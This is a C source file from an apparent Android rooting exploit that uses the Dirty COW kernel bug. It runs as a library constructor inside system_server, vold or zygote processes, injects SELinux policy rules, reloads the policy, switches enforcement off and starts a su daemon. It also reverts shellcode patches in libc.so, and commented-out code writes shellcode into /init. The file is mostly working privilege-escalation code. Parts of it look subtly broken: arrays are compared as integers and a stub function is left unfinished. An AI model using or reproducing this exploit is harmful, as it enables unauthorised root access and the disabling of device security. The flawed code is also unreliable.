#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <android/log.h>
#include "dirtycow.h"
#include "utils.h"
#include "shellcode.h"
#include <sys/socket.h>
#include <fcntl.h>



#define CLOCK_GETTIME_SYSCALL 0x107   //LDR R7, =0x107 SVC 0
#define INIT_PATH "/init"
#define LIBC_PATH "/system/lib/libc.so"
#define POLICY_PATH "/data/local/tmp/sepolicy_modify"
#define SU_DAEMON_PATH "/data/local/tmp/su"
#define PAYLOAD_SIZE 0x160

#define SHELLCODE_RET_OFF 0xd8


#define VICTIM_SYSCALL "clock_gettime"



#define PROPERTY_CONTEXTS "/property_contexts"
#define SEAPP_CONTEXTS "/seapp_contexts"
#define SELINUX_VERSION "/selinux_version"
#define SEPOLICY "/sepolicy"
#define SERVICE_CONTEXTS "/service_contexts"
#define FILE_CONTEXTS "/file_contexts"
#define MAC_PER "/system/etc/security/mac_permissions.xml"


void dlopen_init(void) __attribute__((constructor));
int install_permanent_root();

static unsigned int init_syscall_off = 0;
static int real_vold = 1;
/*
allow zygote shell_data_file:file { read execute open execute_no_trans }
allow zygote shell_exec:file read;
allow zygote kernel : security load_policy
allow zygote labeledfs:filesystem { mount unmount remount };

adb shell su -c dmesg | grep denied | audit2allow -p ~/sepolicy

allow vold kernel:security { load_policy setenforce };
allow vold selinuxfs:file write;
allow vold shell_data_file:dir search;
allow vold shell_data_file:file { read getattr open };

}
*/

void fix_override_sepolicy(void *arg) 
{
    int ret;
    char filename[PATH_MAX];
    char * override_list[] = {
        "/property_contexts",
        "/seapp_contexts",
        "/selinux_version",
        "/sepolicy", 
        "/service_contexts",
        "/file_contexts",
        "/system/etc/security/mac_permissions.xml"
    };

    /*
    copy selinux files to override folder
    */
    if( NULL == opendir(POLICY_OVERRIDE) ){
        if (errno == ENOENT){
            ret = mkdir(POLICY_OVERRIDE, 0600);
            if(ret < 0){
                LOGE("Can't mkdir '%s':  %s\n", POLICY_OVERRIDE, strerror(errno));
                return;
            }
        }else{
            LOGE("Can't opendir '%s':  %s\n", POLICY_OVERRIDE, strerror(errno));
            return;
        }
    }

    chmod(POLICY_OVERRIDE, 0777);
    for(int i=0; i<sizeof(override_list)/sizeof(char*); i++){
        snprintf(filename, sizeof filename, "%s/%s", POLICY_OVERRIDE, strrchr(override_list[i], '/')+1);
        LOGI("[*] cp %s -> %s", override_list[i], filename);
        copy(override_list[i], filename);
    }

    /*
    add rules
    */
    char * pol_list[] = {
        "permissive:zygote",
        "allow:vold:kernel:security:load_policy",
        "allow:vold:kernel:security:setenforce",
        "allow:vold:selinuxfs:file:write",
        "permissive:zygote",
        "allow:zygote:kernel:security:load_policy",
        "allow:zygote:kernel:security:setenforce",
        "allow:zygote:selinuxfs:file:write",
        NULL
    };
    add_policy_rules(pol_list);

    LOGI("[-] trigger init reload policy.");
    __system_property_set("selinux.reload_policy", "1");


    LOGI("[-] trigger vold to setenforce 0");
    int sock;
    int (*socket_local_client)(const char *, int, int) = 
        get_proc_address("/system/lib/libcutils.so", "socket_local_client");
    if ( (sock = socket_local_client("vold", 1, SOCK_STREAM)) < 0)
        LOGW("[-] No socket connection with vold process!\n");
    if ( write(sock, "getpw", strlen("getpw")+1) < 0)
        LOGW("[-] Unable to send data!\n");

}

void setpermissive(void * arg)
{

    if ( revert_all_patchs() < 0 ){
        LOGE("[!] can't revert_all_patchs.");
    }

    if (security_setenforce(0) < 0) {
        LOGE("[!] can't setenforce.");
    }

    LOGI("[*] start daemon su.....");
    char *exec_args[] = {"su", "--daemon", NULL};
    if (!fork_zero_fucks()) {
        execvp("/data/local/tmp/su", exec_args);
    }
    
}


void dlopen_init(void)
{
    pthread_t thrd;
    struct prop ro;
    char security_context[32];
    char major_version[8], minor_version[8], bugfix_version[8];
    char buf[1024] = { 0 };
    int n;


    system_property(&ro);
    sscanf(ro.version_release, "%d.%d.%d", major_version, minor_version, bugfix_version);
    if ( major_version == 4 && minor_version > 3 || major_version >= 5 ) {

        if ( get_proc_security_context( 0, security_context ) < 0) {

            LOGE("[!] dlopen_init : get security context error.");
            return;

        } else {
            //LOGI("[*] process security context %s.", security_context);
            if (!strcmp(security_context, "u:r:system_server:s0")) {
                LOGI("[*] process security context %s.", security_context);
                pthread_create(&thrd, NULL, fix_override_sepolicy, NULL);
            } else if (!strcmp(security_context, "u:r:vold:s0")) {
                LOGI("[*] process security context %s.", security_context);
                //pthread_create(&thrd, NULL, setpermissive, NULL);
            }
        }

        n = readlink("/proc/self/exe" , buf , sizeof(buf));
        if( n > 0 && n < sizeof(buf))
        {
            LOGI("[ :%d ]%s\n" , getuid(), buf);
            if(strstr(buf, "vold")){
                LOGI("[*] setpermissive.");
                pthread_create(&thrd, NULL, setpermissive, NULL);
            }
            else if(strstr(buf, "app_process") && getuid()==0){
                LOGI("[*] setpermissive.");
                pthread_create(&thrd, NULL, setpermissive, NULL);
            }
        }
    } else {
        //for android system version <= 4.3, the selinux is always in permissive mode
        //if process have root priviledge
        if ( 0 == getuid()) {
            pthread_create(&thrd, NULL, install_permanent_root, NULL);
        }

    }
}


int revert_all_patchs() {
    int i, off;
    char r[0x60];
    //1, revert patch from libc.so for avoid system crash on android < 4.x or some customsize rom
    int fnhdr = 0xe1a0c007;
    void * fn_clock_gettime = get_proc_address(LIBC_PATH, VICTIM_SYSCALL);

    /*for testing*/
    struct module_property prop;
    get_module_property(0, LIBC_PATH, &prop);
    
    LOGI("[*] clock_gettime : %08lx, libc: %08lx", fn_clock_gettime, prop.base);

    memset(r, 0, 0x60);

    off = (int)fn_clock_gettime - prop.base;
    for (i=0; i<10; i++){

        if(*(int*)fn_clock_gettime != fnhdr){
            if (-1 == dirtycow_memcpy(LIBC_PATH, off, 4, &fnhdr)) {
                return -1;
            }
            usleep(100);
        }else
            break;    
    }
    LOGI("[*] revert shellcode ");
    dirtycow_memcpy(LIBC_PATH, prop.size-0x60, 0x60, r);

    LOGI("[*] revert all patch done!");
    return 0;
}
/*
int patch_init() {

    init_syscall_off = find_syscall(INIT_PATH, CLOCK_GETTIME_SYSCALL);

    LOGI("[*] init_syscall_off offset : %08lx in /init offset\n", init_syscall_off);

    if ( init_syscall_off == 0) {
        LOGE("[!] init_syscall_off is 0, patch init failed.\n");
        return -1;
    }

    //set shellcode
    struct module_property prop;
    if ( -1 == get_module_property(1, INIT_PATH, &prop) ) {
        LOGE("[*] get /init module property failed.\n");
        return -1;
    }

    unsigned int payload_location_off = prop.size - PAYLOAD_SIZE;
    LOGI("[*] /init base:%08lx, size:%08lx, payload_location_off : %08lx \n ", prop.base, prop.size, payload_location_off);

    if (1) {
        *(unsigned int *)&load_policy32[SHELLCODE_RET_OFF] =  (init_syscall_off + 4 - (payload_location_off + 0xe0)) / 4;
        load_policy32[SHELLCODE_RET_OFF + 3] = 0xea;
        if ( -1 == dirtycow_memcpy(INIT_PATH, payload_location_off, PAYLOAD_SIZE, load_policy32)) {
            return -1;
        }
    }

    //patch /init 's clock_gettime
    *(unsigned int*)&b2payload[0] = (payload_location_off - (init_syscall_off + 8)) / 4;
    *(char*)&b2payload[3] = 0xea;
    LOGI("[*] patch init_syscall_off : %08lx, b2payload : %08lx \n ", init_syscall_off, *(int*)b2payload );
    if (-1 == dirtycow_memcpy(INIT_PATH,  init_syscall_off, 4, b2payload) ) {
        return -1;
    }
    return 0;
}
*/
int install_permanent_root() {

    //1.remount "/system"
    int re = remount("/system", 0);
    LOGW(" remount rc : %d \n" , re);
    //2,cp su bin 2 /system/xbin
    //3,edit recovery-install/sh
    //4,------------------------

}
